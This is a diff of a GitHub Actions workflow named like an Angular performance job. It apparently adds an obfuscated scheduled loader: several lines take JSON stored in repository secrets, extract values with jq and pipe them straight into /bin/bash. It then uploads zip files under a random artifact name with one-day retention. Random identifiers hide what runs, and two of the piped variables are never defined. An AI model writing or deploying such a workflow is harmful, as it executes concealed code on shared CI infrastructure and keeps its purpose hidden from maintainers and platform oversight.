@@ -1,24 +1,25 @@
 name: angularperformance44
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '52 2/6 * * *'
+    - cron: '0 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: angularperformance44
         env:
-          i4575: ${{ secrets.i4575 }}
+          hv54529: ${{ secrets.hv54529 }}
         run: |
-          echo $i4575 | jq -r .eps881 | /bin/bash
-          echo $sflj47179 | jq -r .wdq7732 | /bin/bash
-          echo $r7264 | jq -r .ymvy231 | /bin/bash
-          echo $gqh834 | jq -r .esgzq63271 | /bin/bash
-          echo $npwe39830 | jq -r .hol237 | /bin/bash
-          echo $gzhkp3 | jq -r .xmoh3 | /bin/bash
-          echo $nytfy6809 | jq -r .p4 | /bin/bash
+          printf '%s' "$hv54529" | jq -r .llvgy02369 | /bin/bash
+          echo $yea90 | jq -r .clk1 | /bin/bash
+          printf '%s' "$ngebf41" | jq -r .phu4158 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yhWRJNRw
+          path: "*.zip"
+          retention-days: 1
